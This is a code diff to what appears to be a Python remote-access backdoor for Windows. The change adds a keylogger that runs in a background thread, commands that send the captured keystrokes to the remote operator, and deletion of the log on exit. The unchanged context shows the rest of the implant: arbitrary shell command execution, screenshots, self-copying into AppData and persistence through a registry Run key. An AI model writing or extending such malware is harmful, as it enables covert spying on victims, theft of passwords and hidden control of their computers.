@@ -8,9 +8,9 @@ import shutil # screenshot
 import sys # use in copy function
 import base64
 import requests
-import ctypes
 from mss import mss
-
+import keylogger
+import threading
 
 
 
@@ -82,6 +82,10 @@ def shell():
 	while True:
 		command = reliable_rcv() # receive bytes
 		if command  == "q":
+			try:
+				os.remove(keylogger_path)
+			except:
+				continue
 			break
 		elif command[:2] == "cd" and len(command) > 1:
 			try:
@@ -130,11 +134,17 @@ def shell():
 			start path              -> Start Program on target PC
 			screenshot              -> Take A screenshot
 			check                   -> Check for Privileges
-			key_start               -> Start log
-			key_dump                -> print out log
+			keylog_start            -> Start log
+			keylog_dump             -> print out log
 			q                       -> Exit the Program
 			"""
 			reliable_send(help_options)
+		elif command[:12] == "keylog_start":
+			t1 = threading.Thread(target=keylogger.start)
+			t1.start()
+		elif command[:11] == "keylog_dump":
+			fn = open(keylogger_path, "r")
+			reliable_send(fn.read())
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
@@ -145,6 +155,7 @@ def shell():
 				reliable_send("CAN'T EXECUTE THE COMMAND!!!")
 
 location = os.environ["appdata"] + "\\win.exe"
+keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)
